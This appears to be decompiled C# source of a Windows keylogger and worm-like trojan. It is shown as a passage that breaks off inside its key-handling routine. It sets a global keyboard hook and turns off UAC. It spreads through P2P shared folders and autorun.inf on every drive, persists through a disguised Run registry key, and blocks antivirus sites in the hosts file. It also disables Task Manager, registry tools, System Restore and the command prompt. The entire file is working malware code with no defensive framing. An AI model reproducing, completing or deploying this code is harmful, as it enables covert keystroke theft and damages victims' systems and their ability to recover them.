using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns2;
using ns3;

namespace ns1;

internal class Form1 : Form
{
	internal class Class7
	{
		private struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;
		}

		private delegate int Delegate0(int nCode, int wParam, ref Struct0 lParam);

		internal delegate void Delegate1(Keys Key);

		internal delegate void Delegate2(Keys Key);

		private static Delegate1 delegate1_0;

		private static Delegate2 delegate2_0;

		private static int int_0;

		private static Delegate0 delegate0_0;

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int int_1, Delegate0 delegate0_1, int int_2, int int_3);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int int_1, int int_2, int int_3, Struct0 struct0_0);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int int_1);

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public static void smethod_0(Delegate1 delegate1_1)
		{
			delegate1_0 = (Delegate1)Delegate.Combine(delegate1_0, delegate1_1);
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public static void smethod_1(Delegate1 delegate1_1)
		{
			delegate1_0 = (Delegate1)Delegate.Remove(delegate1_0, delegate1_1);
		}

		public Class7()
		{
			delegate0_0 = smethod_2;
			int_0 = SetWindowsHookExA(13, delegate0_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int smethod_2(int int_1, int int_2, ref Struct0 struct0_0)
		{
			if (int_1 == 0)
			{
				switch (int_2)
				{
				case 256:
				case 260:
					delegate1_0?.Invoke((Keys)struct0_0.int_0);
					break;
				case 257:
				case 261:
					delegate2_0?.Invoke((Keys)struct0_0.int_0);
					break;
				}
			}
			return CallNextHookEx(int_0, int_1, int_2, struct0_0);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(int_0);
			base.Finalize();
		}
	}

	private IContainer icontainer_0;

	private TextBox textBox_0;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	private Timer timer_5;

	private RichTextBox richTextBox_0;

	private Timer timer_6;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private string string_23;

	private string string_24;

	private string string_25;

	private string string_26;

	private string string_27;

	private string string_28;

	private string string_29;

	private string string_30;

	private string string_31;

	private string string_32;

	private string string_33;

	private string string_34;

	private string string_35;

	private string string_36;

	private string string_37;

	private string string_38;

	private string string_39;

	private string string_40;

	private string string_41;

	private string string_42;

	private string string_43;

	private string string_44;

	private string string_45;

	private string string_46;

	private string string_47;

	private string string_48;

	private string string_49;

	private string string_50;

	private string string_51;

	private string string_52;

	private string string_53;

	private string string_54;

	private string string_55;

	private string string_56;

	private string string_57;

	private string string_58;

	private object object_0;

	private object object_1;

	private object object_2;

	private object object_3;

	private object object_4;

	private object object_5;

	private object object_6;

	private object object_7;

	private object object_8;

	private object object_9;

	private object object_10;

	private object object_11;

	private object object_12;

	private object object_13;

	private object object_14;

	private string string_59;

	private Class7 class7_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\";
		string_1 = ((ServerComputer)Class1.smethod_0()).get_Name() + "-" + Conversions.ToString(DateAndTime.Hour(DateAndTime.get_Now())) + "-" + Conversions.ToString(DateAndTime.Minute(DateAndTime.get_Now())) + "-" + DateTime.Now.ToString().Replace("/", "-").Replace(" ", "---")
			.Replace(":", "-");
		string_10 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string_59 = null;
		vmethod_18(new Class7());
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new TextBox());
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new Timer(icontainer_0));
		vmethod_7(new Timer(icontainer_0));
		vmethod_9(new Timer(icontainer_0));
		vmethod_11(new Timer(icontainer_0));
		vmethod_13(new Timer(icontainer_0));
		vmethod_15(new RichTextBox());
		vmethod_17(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(12, 12);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("TextBox1");
		TextBox obj2 = vmethod_0();
		Size size = new Size(100, 20);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		vmethod_2().set_Interval(600000);
		vmethod_6().set_Interval(50000);
		vmethod_8().set_Interval(20000);
		vmethod_10().set_Interval(200000);
		vmethod_12().set_Interval(100000);
		RichTextBox obj3 = vmethod_14();
		location = new Point(40, -81);
		((Control)obj3).set_Location(location);
		((Control)vmethod_14()).set_Name("ztext");
		RichTextBox obj4 = vmethod_14();
		size = new Size(100, 96);
		((Control)obj4).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(1);
		vmethod_14().set_Text("");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(112, 27);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_1)
	{
		textBox_0 = textBox_1;
	}

	[SpecialName]
	internal virtual Timer vmethod_2()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Timer timer_7)
	{
		EventHandler eventHandler = method_4;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_7;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_4()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Timer timer_7)
	{
		EventHandler eventHandler = method_5;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_7;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_6()
	{
		return timer_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Timer timer_7)
	{
		EventHandler eventHandler = method_6;
		if (timer_2 != null)
		{
			timer_2.remove_Tick(eventHandler);
		}
		timer_2 = timer_7;
		if (timer_2 != null)
		{
			timer_2.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_8()
	{
		return timer_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Timer timer_7)
	{
		EventHandler eventHandler = method_7;
		if (timer_3 != null)
		{
			timer_3.remove_Tick(eventHandler);
		}
		timer_3 = timer_7;
		if (timer_3 != null)
		{
			timer_3.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_10()
	{
		return timer_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Timer timer_7)
	{
		EventHandler eventHandler = method_8;
		if (timer_4 != null)
		{
			timer_4.remove_Tick(eventHandler);
		}
		timer_4 = timer_7;
		if (timer_4 != null)
		{
			timer_4.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_12()
	{
		return timer_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Timer timer_7)
	{
		EventHandler eventHandler = method_9;
		if (timer_5 != null)
		{
			timer_5.remove_Tick(eventHandler);
		}
		timer_5 = timer_7;
		if (timer_5 != null)
		{
			timer_5.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_14()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(RichTextBox richTextBox_1)
	{
		richTextBox_0 = richTextBox_1;
	}

	[SpecialName]
	internal virtual Timer vmethod_16()
	{
		return timer_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(Timer timer_7)
	{
		EventHandler eventHandler = method_10;
		if (timer_6 != null)
		{
			timer_6.remove_Tick(eventHandler);
		}
		timer_6 = timer_7;
		if (timer_6 != null)
		{
			timer_6.add_Tick(eventHandler);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int int_0, uint uint_0, uint uint_1, int int_1);

	public void method_0(string string_60)
	{
		try
		{
			List<string> list = new List<string>();
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\derahS\\eriWemiL\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\gnimocni\\0002yeknoDe\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\redlof derahs ym\\aazak\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\redlof derahs ym\\etil aazak\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\redlof derahs ym\\++k etil aazak\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\retskorg ym\\retskorg\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\gnimocni\\elume\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\redlof derahs ym\\suehprom\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\retskorg ym\\retskorg\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\selif\\alset\\"));
			list.Add(Interaction.Environ(Strings.StrReverse("selifmargorp")) + Strings.StrReverse("\\derahs\\xmniw\\"));
			foreach (string item in list)
			{
				File.Copy(Application.get_ExecutablePath(), item + string_60);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0532: Unknown result type (might be due to invalid IL or missing references)
		//IL_0559: Unknown result type (might be due to invalid IL or missing references)
		//IL_075e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0785: Unknown result type (might be due to invalid IL or missing references)
		if (((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName().Contains("Windows 7"))
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("EnableLUA", 0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		byte[] bytes = Class8.smethod_0(Application.get_ExecutablePath(), "0");
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "@DmCD95fdwysEecVxJbRA@", -1, (CompareMethod)0);
		object_3 = array[1];
		object_4 = array[2];
		object_5 = array[3];
		object_6 = array[4];
		object_7 = array[5];
		object_8 = array[6];
		object_9 = array[7];
		object_10 = array[8];
		object_11 = array[9];
		object_12 = array[10];
		object_13 = array[11];
		object_14 = array[12];
		string_24 = array[13];
		string_25 = array[14];
		string_26 = array[15];
		string_27 = array[16];
		string_28 = array[17];
		string_29 = array[18];
		string_30 = array[19];
		string_31 = array[20];
		string_32 = array[21];
		string_33 = array[22];
		string_34 = array[23];
		string_35 = array[24];
		string_36 = array[25];
		string_37 = array[26];
		string_38 = array[27];
		string_39 = array[28];
		string_40 = array[29];
		string_41 = array[30];
		string_42 = array[31];
		string_43 = array[32];
		string_44 = array[33];
		string_45 = array[34];
		string_46 = array[35];
		string_47 = array[36];
		string_48 = array[37];
		string_49 = array[38];
		string_50 = array[39];
		string_51 = array[40];
		string_52 = array[41];
		string_54 = array[42];
		string_55 = array[43];
		string_56 = array[44];
		string_19 = array[45];
		string_57 = array[46];
		string_23 = array[47];
		string_21 = array[48];
		string_22 = array[49];
		string_12 = array[50];
		string_13 = array[51];
		string_14 = array[52];
		string_15 = array[53];
		string_16 = array[54];
		string_17 = array[55];
		string_18 = array[56];
		object_2 = array[57];
		object_1 = array[58];
		object_0 = array[59];
		string_53 = array[60];
		string_58 = array[61];
		string_2 = array[62];
		string_3 = array[63];
		string_7 = array[64];
		string_8 = array[65];
		string_9 = array[66];
		try
		{
			if (Operators.CompareString(string_39, "true", false) == 0)
			{
				Class5.smethod_0();
			}
			if (Operators.CompareString(string_40, "true", false) == 0)
			{
				Class5.smethod_1();
			}
			if (Operators.CompareString(string_41, "true", false) == 0)
			{
				Class5.smethod_2();
			}
			if (Operators.CompareString(string_42, "true", false) == 0)
			{
				Class5.smethod_3();
			}
			if (Operators.CompareString(string_43, "true", false) == 0)
			{
				Class5.smethod_4();
			}
			if (Operators.CompareString(string_44, "true", false) == 0)
			{
				Class5.smethod_5();
			}
			if (Operators.CompareString(string_45, "true", false) == 0)
			{
				Class5.smethod_6();
			}
			if (Operators.CompareString(string_46, "true", false) == 0)
			{
				Class5.smethod_7();
			}
			if (Operators.CompareString(string_47, "true", false) == 0)
			{
				Class5.smethod_8();
			}
			if (Operators.CompareString(string_48, "true", false) == 0)
			{
				Class5.smethod_9();
			}
			if (Operators.CompareString(string_49, "true", false) == 0)
			{
				Class5.smethod_10();
			}
			if (Operators.CompareString(string_50, "true", false) == 0)
			{
				Class5.smethod_11();
			}
			if (Operators.CompareString(string_51, "true", false) == 0)
			{
				Class5.smethod_12();
			}
			if (Operators.CompareString(string_52, "true", false) == 0)
			{
				Class5.smethod_13();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(string_53, "true", false) == 0)
		{
			try
			{
				method_0("SteamHack.exe");
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(string_57, "true", false) == 0)
		{
			try
			{
				method_1();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(string_19, "true", false) == 0)
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		checked
		{
			try
			{
				if (!File.Exists(string_10 + "AUTOEXEC.exe"))
				{
					if (Operators.CompareString(string_36, "true", false) == 0)
					{
						if (Operators.CompareString(string_37, "critical", false) == 0)
						{
							Interaction.MsgBox((object)string_38, (MsgBoxStyle)16, (object)"Warning!");
						}
						if (Operators.CompareString(string_37, "information", false) == 0)
						{
							Interaction.MsgBox((object)string_38, (MsgBoxStyle)16, (object)"Warning!");
						}
					}
					if (Operators.CompareString(string_54, "true", false) == 0)
					{
						SendMessage(-1, 274u, 61808u, 2);
					}
					if (Operators.CompareString(string_55, "true", false) == 0)
					{
						int num = 1500;
						do
						{
							Console.Beep(num, 50);
							num += -5;
						}
						while (num >= 1000);
						Console.Beep(500, 2000);
					}
					if (Operators.CompareString(string_56, "true", false) == 0)
					{
						Class9.smethod_0();
					}
					if (Operators.CompareString(string_21, "true", false) == 0)
					{
						try
						{
							((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), string_10 + string_22, true);
							File.SetAttributes(string_10 + string_22, FileAttributes.Hidden);
							RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
							registryKey2.SetValue("WindowsDll", string_10 + string_22);
							registryKey2.Close();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
					((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), string_10 + "AUTOEXEC.exe", true);
					File.SetAttributes(string_10 + "AUTOEXEC.exe", FileAttributes.Hidden);
					Thread.Sleep(500);
					if (Operators.CompareString(string_21, "true", false) == 0)
					{
						Process.Start(string_10 + string_22);
					}
					else
					{
						Process.Start(string_10 + "AUTOEXEC.exe");
					}
					Application.Exit();
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				if (!File.Exists(string_0 + "AUTOEXEC.exe"))
				{
					if (Operators.CompareString(string_36, "true", false) == 0)
					{
						if (Operators.CompareString(string_37, "critical", false) == 0)
						{
							Interaction.MsgBox((object)string_38, (MsgBoxStyle)16, (object)"Warning!");
						}
						if (Operators.CompareString(string_37, "information", false) == 0)
						{
							Interaction.MsgBox((object)string_38, (MsgBoxStyle)16, (object)"Warning!");
						}
					}
					if (Operators.CompareString(string_54, "true", false) == 0)
					{
						SendMessage(-1, 274u, 61808u, 2);
					}
					if (Operators.CompareString(string_55, "true", false) == 0)
					{
						int num2 = 1500;
						do
						{
							Console.Beep(num2, 50);
							num2 += -5;
						}
						while (num2 >= 1000);
						Console.Beep(500, 2000);
					}
					if (Operators.CompareString(string_56, "true", false) == 0)
					{
						Class9.smethod_0();
					}
					if (Operators.CompareString(string_21, "true", false) == 0)
					{
						try
						{
							((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), string_0 + string_22, true);
							File.SetAttributes(string_0 + string_22, FileAttributes.Hidden);
							RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
							registryKey3.SetValue("WindowsDll", string_0 + string_22);
							registryKey3.Close();
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
					}
					((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), string_0 + "AUTOEXEC.exe", true);
					File.SetAttributes(string_0 + "AUTOEXEC.exe", FileAttributes.Hidden);
					Thread.Sleep(500);
					if (Operators.CompareString(string_21, "true", false) == 0)
					{
						Process.Start(string_0 + string_22);
					}
					else
					{
						Process.Start(string_0 + "AUTOEXEC.exe");
					}
					Application.Exit();
				}
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(string_24, "true", false) == 0)
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
				string path = folderPath + "\\drivers\\etc\\\\hosts";
				StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.Write("##Hosts file edit");
				streamWriter.Write(Environment.NewLine);
				if (Operators.CompareString(string_25, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.virustotal.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_26, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 vscan.novirusthanks.org");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_27, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 virscan.org");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_28, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 virus-trap.org");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_29, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.google.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_30, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.yahoo.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_31, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.ask.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_32, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.altavista.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_33, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.facebook.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_34, "true", false) == 0)
				{
					streamWriter.Write("127.0.0.1 www.myspace.com");
					streamWriter.Write(Environment.NewLine);
				}
				if (Operators.CompareString(string_35, "True", false) == 0)
				{
					streamWriter.Write("127.0.0.1 twitter.com");
					streamWriter.Write(Environment.NewLine);
				}
				streamWriter.Dispose();
			}
			if (Operators.ConditionalCompareObjectEqual(object_6, (object)"rc", false))
			{
				if (Operators.CompareString(string_2, "true", false) == 0)
				{
					string_11 = Class17.smethod_0(Conversions.ToString(object_3), Conversions.ToString(object_7));
					string_20 = Class17.smethod_0(Conversions.ToString(object_4), Conversions.ToString(object_7));
				}
				if (Operators.CompareString(string_3, "true", false) == 0)
				{
					string_4 = Class17.smethod_0(string_7, Conversions.ToString(object_7));
					string_5 = Class17.smethod_0(string_8, Conversions.ToString(object_7));
					string_6 = Class17.smethod_0(string_9, Conversions.ToString(object_7));
				}
			}
			if (Operators.ConditionalCompareObjectEqual(object_6, (object)"des", false))
			{
				if (Operators.CompareString(string_2, "true", false) == 0)
				{
					string_11 = Class6.smethod_0(Conversions.ToString(object_3), Conversions.ToString(object_7), bool_0: true);
					string_20 = Class6.smethod_0(Conversions.ToString(object_4), Conversions.ToString(object_7), bool_0: true);
				}
				if (Operators.CompareString(string_3, "true", false) == 0)
				{
					string_4 = Class6.smethod_0(string_7, Conversions.ToString(object_7), bool_0: true);
					string_5 = Class6.smethod_0(string_8, Conversions.ToString(object_7), bool_0: true);
					string_6 = Class6.smethod_0(string_9, Conversions.ToString(object_7), bool_0: true);
				}
			}
			if (Operators.ConditionalCompareObjectEqual(object_8, (object)"true", false))
			{
				((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
			}
			if (Operators.ConditionalCompareObjectEqual(object_9, (object)"true", false))
			{
				((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
			}
			if (Operators.ConditionalCompareObjectEqual(object_10, (object)"true", false))
			{
				((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
			}
			if (Operators.ConditionalCompareObjectEqual(object_11, (object)"true", false))
			{
				((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
			}
			vmethod_2().set_Interval(Conversions.ToInteger(string_23));
			vmethod_16().set_Interval(Conversions.ToInteger(string_23));
			if (Operators.CompareString(string_2, "true", false) == 0)
			{
				vmethod_2().Start();
			}
			if (Operators.CompareString(string_3, "true", false) == 0)
			{
				vmethod_16().Start();
			}
			vmethod_4().Start();
			if (Operators.ConditionalCompareObjectEqual(object_12, (object)"true", false))
			{
				vmethod_6().Start();
			}
			vmethod_8().Start();
			if (Operators.CompareString(string_12, "true", false) == 0)
			{
				vmethod_10().Start();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_1()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		checked
		{
			try
			{
				ListBox val = new ListBox();
				for (int i = 0; i != ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_Drives().Count - 1; i++)
				{
					val.get_Items().Add((object)((ServerComputer)Class1.smethod_0()).get_FileSystem().get_Drives()[i].ToString());
				}
				for (int i = 0; i != val.get_Items().get_Count(); i++)
				{
					try
					{
						try
						{
							((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe")));
							((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")));
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe")));
						FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
						FileSystem.FilePut(1, "[autorun]\r\nshellexecute=sys.exe", -1L, false);
						FileSystem.FileClose(new int[1] { 1 });
						try
						{
							((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string method_2()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_18(Class7 class7_1)
	{
		Class7.Delegate1 delegate1_ = method_3;
		if (class7_0 != null)
		{
			Class7.smethod_1(delegate1_);
		}
		class7_0 = class7_1;
		if (class7_0 != null)
		{
			Class7.smethod_0(delegate1_);
		}
	}

	private void method_3(Keys keys_0)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
